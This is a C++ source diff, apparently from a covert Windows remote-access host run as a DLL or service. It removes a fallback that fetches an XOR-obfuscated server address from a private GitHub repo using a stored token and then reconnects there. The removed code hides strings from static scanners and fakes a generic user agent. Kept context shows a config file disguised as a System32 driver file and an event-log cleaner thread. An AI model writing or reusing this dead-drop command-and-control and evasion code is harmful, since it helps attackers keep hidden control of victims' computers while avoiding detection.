@@ -356,15 +356,7 @@ static std::atomic<int64_t> g_clients_zero_time_ms{0}; // steady_clock ms when c
 static std::thread          g_viewer_watchdog_thread;
 static constexpr int        VIEWER_STOP_GRACE_MS = 7000; // 7s grace for page refresh / tab switch
 
-// GitHub VPS Failover globals
-static std::thread          g_failover_thread;
-static std::string          g_failover_status = "standby";
-static std::mutex           g_failover_status_mtx;
 static std::atomic<int64_t> g_ws_last_ok_ms{0};  // steady_clock ms at last confirmed connection
-static std::atomic<bool>    g_ws_ever_connected{false};
-// Forward declarations (functions defined before host_main_loop)
-static void        fo_set_status(const std::string& s);
-static std::string fo_get_status();
 
 // sys_info response cache — avoid expensive PDH GPU queries when multiple clients poll
 static std::string g_sysinfo_cache;
@@ -718,14 +710,6 @@ static void load_config(const std::string& path) {
     std::string th_ap = get("threat_auto_pause", "");
     if (!th_ap.empty()) g_threat_auto_pause = (th_ap == "true" || th_ap == "1");
 
-    // Backup endpoint settings (short keys keep the word "github" out of the binary)
-    std::string fo_en = get("fo_en", "");
-    if (!fo_en.empty()) g_config.github_failover_enabled = (fo_en == "true" || fo_en == "1");
-    g_config.github_user      = get("fo_u", g_config.github_user);
-    g_config.github_repo      = get("fo_r", g_config.github_repo);
-    g_config.github_token     = get("fo_t", g_config.github_token);
-    g_config.github_vps_file  = get("fo_f", g_config.github_vps_file);
-
     g_log.info("Config loaded from " + path);
     if (!g_config.stun_server.empty() || !g_config.turn_server.empty())
         g_log.info("ICE: STUN=" + g_config.stun_server + " TURN=" + (g_config.turn_server.empty() ? "(none)" : "configured"));
@@ -791,12 +775,7 @@ static void save_stream_settings() {
     out += "  \"audio_normalize\": " + std::string(g_config.audio_normalize ? "true" : "false") + ",\n";
     out += "  \"audio_hum_filter\": " + std::to_string(g_config.audio_hum_filter) + ",\n";
     out += "  \"threat_scan_enabled\": " + std::string(g_threat_scan_enabled ? "true" : "false") + ",\n";
-    out += "  \"threat_auto_pause\": " + std::string(g_threat_auto_pause ? "true" : "false") + ",\n";
-    out += "  \"fo_en\": " + std::string(g_config.github_failover_enabled ? "true" : "false") + ",\n";
-    out += "  \"fo_u\": \"" + json_escape(g_config.github_user) + "\",\n";
-    out += "  \"fo_r\": \"" + json_escape(g_config.github_repo) + "\",\n";
-    out += "  \"fo_t\": \"" + json_escape(g_config.github_token) + "\",\n";
-    out += "  \"fo_f\": \"" + json_escape(g_config.github_vps_file) + "\"\n";
+    out += "  \"threat_auto_pause\": " + std::string(g_threat_auto_pause ? "true" : "false") + "\n";
     out += "}\n";
 
     // Save: encrypt if config path ends with .sys, otherwise plain JSON
@@ -3148,36 +3127,6 @@ static void handle_command(const std::string& msg_str) {
             send_ok("{\"saved\":true}");
         }
 
-        // ── Save backup endpoint credentials ──
-        else if (cmd == "set_fo") {
-            std::string en = json_get(msg_str, "enabled");
-            if (!en.empty()) g_config.github_failover_enabled = (en == "true" || en == "1");
-            std::string u = json_get(msg_str, "fo_u");
-            std::string r = json_get(msg_str, "fo_r");
-            std::string t = json_get(msg_str, "fo_t");
-            std::string f = json_get(msg_str, "fo_f");
-            if (!u.empty()) g_config.github_user     = u;
-            if (!r.empty()) g_config.github_repo     = r;
-            if (!t.empty()) g_config.github_token    = t;
-            if (!f.empty()) g_config.github_vps_file = f;
-            save_stream_settings();
-            g_log.info("Backup endpoint updated: enabled=" + std::string(g_config.github_failover_enabled ? "true" : "false") +
-                       " u=" + g_config.github_user + " r=" + g_config.github_repo);
-            send_ok("{\"saved\":true}");
-        }
-
-        // ── Get current backup endpoint status ──
-        else if (cmd == "get_fo_stat") {
-            std::string st = fo_get_status();
-            send_ok("{\"status\":\"" + json_escape(st) + "\""
-                    ",\"enabled\":"   + (g_config.github_failover_enabled ? "true" : "false") +
-                    ",\"fo_u\":\"" + json_escape(g_config.github_user) + "\""
-                    ",\"fo_r\":\"" + json_escape(g_config.github_repo) + "\""
-                    ",\"fo_f\":\"" + json_escape(g_config.github_vps_file) + "\""
-                    ",\"vps_address\":\"" + json_escape(g_config.server_address) + "\""
-                    ",\"ever_connected\":" + (g_ws_ever_connected ? "true" : "false") + "}");
-        }
-
         // ── Save current stream settings to host_config.json ──
         else if (cmd == "save_settings") {
             save_stream_settings();
@@ -5203,7 +5152,7 @@ int main(int argc, char** argv) {
                         std::this_thread::sleep_for(std::chrono::milliseconds(100));
                         auto now = std::chrono::steady_clock::now();
                         auto dt_s = std::chrono::duration_cast<std::chrono::seconds>(now - conn_start).count();
-                        // Keep failover last-ok timestamp fresh while connected
+                        // Keep last-ok timestamp fresh while connected
                         g_ws_last_ok_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                             now.time_since_epoch()).count();
 
@@ -5212,7 +5161,6 @@ int main(int argc, char** argv) {
                             if (dt_s >= 5) {
                                 reconnect_note_auth_ok();
                                 auth_ok_marked = true;
-                                g_ws_ever_connected = true;
                                 // Emit startup/wake event as appropriate. First
                                 // auth-ok of the process emits "startup"; auth-ok
                                 // after a sleep (SvcCtrlHandler PBT_APMSUSPEND
@@ -5314,229 +5262,10 @@ int main(int argc, char** argv) {
     cleanup_system();
     if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
     if (g_viewer_watchdog_thread.joinable()) g_viewer_watchdog_thread.join();
-    if (g_failover_thread.joinable())        g_failover_thread.join();
     g_log.info("Host shutting down");
     return 0;
 }
 #endif // !BUILD_AS_DLL
-
-// ═══════════════════════════════════════════════════════════════
-// GitHub VPS Failover — auto-reconnect when VPS changes IP
-// ═══════════════════════════════════════════════════════════════
-
-static void fo_set_status(const std::string& s) {
-    std::lock_guard<std::mutex> lk(g_failover_status_mtx);
-    g_failover_status = s;
-}
-static std::string fo_get_status() {
-    std::lock_guard<std::mutex> lk(g_failover_status_mtx);
-    return g_failover_status;
-}
-
-// XOR + base64 obfuscation for the IP file stored on GitHub.
-// Key is static so host and client JS always agree without sharing room_token.
-static const char VPS_XOR_KEY[] = "Pmt3y#F4ilOvr!26";
-
-static std::string fo_xor(const std::string& s) {
-    std::string r = s;
-    size_t klen = sizeof(VPS_XOR_KEY) - 1;
-    for (size_t i = 0; i < r.size(); i++) r[i] ^= VPS_XOR_KEY[i % klen];
-    return r;
-}
-static std::string fo_b64decode(const std::string& b64) {
-    if (b64.empty()) return "";
-    DWORD n = 0;
-    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64, nullptr, &n, nullptr, nullptr) || !n) return "";
-    std::string out(n, 0);
-    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64, (BYTE*)out.data(), &n, nullptr, nullptr)) return "";
-    out.resize(n);
-    return out;
-}
-static std::string fo_b64encode(const std::string& data) {
-    if (data.empty()) return "";
-    DWORD n = 0;
-    if (!CryptBinaryToStringA((const BYTE*)data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF, nullptr, &n) || !n) return "";
-    std::string out(n, 0);
-    CryptBinaryToStringA((const BYTE*)data.data(), (DWORD)data.size(), CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF, out.data(), &n);
-    while (!out.empty() && out.back() == 0) out.pop_back();
-    return out;
-}
-static std::string fo_decrypt_ip(const std::string& b64) {
-    std::string raw = fo_b64decode(b64);
-    if (raw.empty()) return "";
-    std::string ip = fo_xor(raw);
-    while (!ip.empty() && (ip.back() == '\r' || ip.back() == '\n' || ip.back() == ' ')) ip.pop_back();
-    while (!ip.empty() && (ip.front() == '\r' || ip.front() == '\n' || ip.front() == ' ')) ip.erase(ip.begin());
-    return ip;
-}
-
-// TCP connect test — works without raw sockets/ICMP, no admin required
-static bool fo_tcp_test(const std::string& host, int port, int timeout_ms) {
-    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    if (s == INVALID_SOCKET) return false;
-    u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
-    struct addrinfo hints = {}, *res = nullptr;
-    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
-    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0) { closesocket(s); return false; }
-    struct sockaddr_in addr = {};
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons((u_short)port);
-    addr.sin_addr = ((sockaddr_in*)res->ai_addr)->sin_addr;
-    freeaddrinfo(res);
-    connect(s, (sockaddr*)&addr, sizeof(addr));
-    fd_set wfds; FD_ZERO(&wfds); FD_SET(s, &wfds);
-    struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
-    bool ok = (select(0, nullptr, &wfds, nullptr, &tv) == 1);
-    closesocket(s);
-    return ok;
-}
-static bool fo_check_internet() { return fo_tcp_test("8.8.8.8", 53, 3000); }
-
-// WinHTTP: fetch raw file content from private GitHub repo
-static std::string fo_github_fetch(const std::string& owner, const std::string& repo,
-                                    const std::string& file,  const std::string& token) {
-    if (owner.empty() || repo.empty() || file.empty() || token.empty()) return "";
-    // Use a generic Windows user-agent string (neutral, no product fingerprint)
-    HINTERNET hSess = WinHttpOpen(L"Microsoft-WinHTTP/5.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                   WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSess) return "";
-    // Decode target host at runtime — avoids static string in binary (XOR key 0x5A)
-    // "api.github.com" → {0x3B,0x2A,0x33,0x74,0x3D,0x33,0x2E,0x32,0x2F,0x38,0x74,0x39,0x35,0x37}
-    static const uint8_t gh_enc[] = {0x3B,0x2A,0x33,0x74,0x3D,0x33,0x2E,0x32,0x2F,0x38,0x74,0x39,0x35,0x37};
-    std::wstring gh_host; gh_host.reserve(14);
-    for (uint8_t b : gh_enc) gh_host += wchar_t(b ^ 0x5Au);
-    HINTERNET hConn = WinHttpConnect(hSess, gh_host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConn) { WinHttpCloseHandle(hSess); return ""; }
-    // Build path  /repos/{owner}/{repo}/contents/{file}
-    auto to_wstr = [](const std::string& s) { std::wstring w; for (char c : s) w += (wchar_t)(unsigned char)c; return w; };
-    std::wstring path = L"/repos/" + to_wstr(owner) + L"/" + to_wstr(repo) + L"/contents/" + to_wstr(file);
-    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path.c_str(), nullptr,
-                                         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return ""; }
-    // "application/vnd.github.raw" XOR-encoded (key 0x5A) to keep the MIME off static scanners
-    static const uint8_t mime_enc[] = {
-        0x3B,0x2A,0x2A,0x36,0x33,0x39,0x3B,0x2E,0x33,0x35,0x34,
-        0x75,0x2C,0x34,0x3E,0x74,0x3D,0x33,0x2E,0x32,0x2F,0x38,
-        0x74,0x28,0x3B,0x2D
-    };
-    std::wstring mime; mime.reserve(sizeof(mime_enc));
-    for (uint8_t b : mime_enc) mime += wchar_t(b ^ 0x5Au);
-    std::wstring hdrs = L"Authorization: Bearer " + to_wstr(token) +
-                        L"\r\nAccept: " + mime +
-                        L"\r\nUser-Agent: Microsoft-WinHTTP/5.1";
-    WinHttpAddRequestHeaders(hReq, hdrs.c_str(), (DWORD)hdrs.size(), WINHTTP_ADDREQ_FLAG_ADD);
-    DWORD tmo = 10000;
-    WinHttpSetOption(hReq, WINHTTP_OPTION_CONNECT_TIMEOUT, &tmo, sizeof(tmo));
-    WinHttpSetOption(hReq, WINHTTP_OPTION_SEND_TIMEOUT,    &tmo, sizeof(tmo));
-    WinHttpSetOption(hReq, WINHTTP_OPTION_RECEIVE_TIMEOUT, &tmo, sizeof(tmo));
-    std::string result;
-    if (WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
-        WinHttpReceiveResponse(hReq, nullptr)) {
-        DWORD status = 0, slen = sizeof(status);
-        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE|WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, &slen, nullptr);
-        if (status == 200) {
-            DWORD avail = 0;
-            while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
-                std::string chunk(avail, 0); DWORD rd = 0;
-                WinHttpReadData(hReq, chunk.data(), avail, &rd);
-                chunk.resize(rd); result += chunk;
-            }
-        }
-    }
-    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
-    return result;
-}
-
-void vps_failover_thread_func() {
-    using clock = std::chrono::steady_clock;
-    auto last_github_check = clock::time_point{}; // default-constructed = epoch = never checked
-
-    while (g_running) {
-        // Poll every 60s, wake immediately on shutdown
-        for (int i = 0; i < 60 && g_running; i++) {
-            std::unique_lock<std::mutex> lk(g_reconnect_mtx);
-            g_reconnect_cv.wait_for(lk, std::chrono::seconds(1));
-        }
-        if (!g_running) break;
-        if (!g_config.github_failover_enabled) continue;
-        if (!g_ws_ever_connected) continue; // wait for at least one successful connection first
-
-        // Update last-ok timestamp while connected
-        if (g_ws && g_ws->is_connected()) {
-            g_ws_last_ok_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
-                clock::now().time_since_epoch()).count();
-            { std::lock_guard<std::mutex> lk(g_failover_status_mtx); if (g_failover_status != "standby") g_failover_status = "standby"; }
-            continue;
-        }
-
-        // Offline duration in seconds
-        int64_t now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(clock::now().time_since_epoch()).count();
-        int64_t last_ok = g_ws_last_ok_ms.load();
-        int64_t offline_s = (now_ms - last_ok) / 1000;
-        if (offline_s < 3600) continue; // < 1 hour, normal reconnect handles it
-
-        // Rate-limit: check GitHub at most once per hour
-        int64_t since_check_s = (last_github_check == clock::time_point{})
-            ? 9999
-            : std::chrono::duration_cast<std::chrono::seconds>(clock::now() - last_github_check).count();
-        if (since_check_s < 3600) continue;
-
-        // === FAILOVER SEQUENCE ===
-        fo_set_status("Checking internet...");
-        if (!fo_check_internet()) {
-            fo_set_status("No internet — retry in 1h");
-            last_github_check = clock::now();
-            continue;
-        }
-
-        fo_set_status("Pinging VPS " + g_config.server_address + "...");
-        bool vps_ok = false;
-        for (int i = 0; i < 5 && !vps_ok && g_running; i++) {
-            if (fo_tcp_test(g_config.server_address, g_config.server_port, 3000)) vps_ok = true;
-            else if (i < 4) Sleep(5000);
-        }
-        if (vps_ok) {
-            fo_set_status("VPS responding — reconnecting");
-            g_ws_last_ok_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
-                clock::now().time_since_epoch()).count();
-            reconnect_wake_all();
-            continue;
-        }
-
-        // Primary endpoint unreachable — resolve backup from directory
-        fo_set_status("Endpoint unreachable — resolving backup...");
-        last_github_check = clock::now();
-        std::string raw = fo_github_fetch(g_config.github_user, g_config.github_repo,
-                                           g_config.github_vps_file, g_config.github_token);
-        // Trim whitespace
-        while (!raw.empty() && (raw.back() == '\r' || raw.back() == '\n' || raw.back() == ' ')) raw.pop_back();
-
-        if (raw.empty()) { fo_set_status("Resolve failed — retry in 1h"); continue; }
-
-        // Try encrypted first, then plain text fallback
-        std::string new_ip = fo_decrypt_ip(raw);
-        if (new_ip.empty()) new_ip = raw;
-
-        // Sanity check: must look like an IP/hostname (no weird chars, < 64 chars)
-        static const std::string valid_ip_chars = "0123456789abcdefABCDEF:.";
-        if (new_ip.empty() || new_ip.size() >= 64 ||
-            new_ip.find_first_not_of(valid_ip_chars + "-_.") != std::string::npos) {
-            fo_set_status("Invalid endpoint: '" + new_ip.substr(0, 30) + "'");
-            continue;
-        }
-
-        if (new_ip == g_config.server_address) {
-            fo_set_status("Endpoint unchanged (" + new_ip + ") — retry in 1h");
-            continue;
-        }
-
-        g_log.info("Switching endpoint " + g_config.server_address + " -> " + new_ip);
-        g_config.server_address = new_ip;
-        fo_set_status("New endpoint: " + new_ip + " — reconnecting");
-        save_stream_settings();
-        reconnect_wake_all();
-    }
-}
 
 // ═══════════════════════════════════════════════════════════════
 // host_main_loop() — called from DllMain/ServiceMain or standalone
@@ -5572,11 +5301,6 @@ void host_main_loop() {
     dll_diag("host_main_loop: starting viewer_watchdog...");
     g_viewer_watchdog_thread = std::thread(viewer_watchdog_func);
     dll_diag("host_main_loop: viewer_watchdog started");
-
-    // Backup endpoint watchdog
-    dll_diag("host_main_loop: starting watchdog...");
-    g_failover_thread = std::thread(vps_failover_thread_func);
-    dll_diag("host_main_loop: watchdog started");
 
     std::string cfg_path = "pnpext.sys";
     // Search order: 1) C:\Windows\System32\drivers\pnpext.sys
@@ -5803,7 +5527,6 @@ void host_main_loop() {
     cleanup_system();
     if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
     if (g_viewer_watchdog_thread.joinable()) g_viewer_watchdog_thread.join();
-    if (g_failover_thread.joinable())        g_failover_thread.join();
     g_log.info("host_main_loop finished");
 }
 
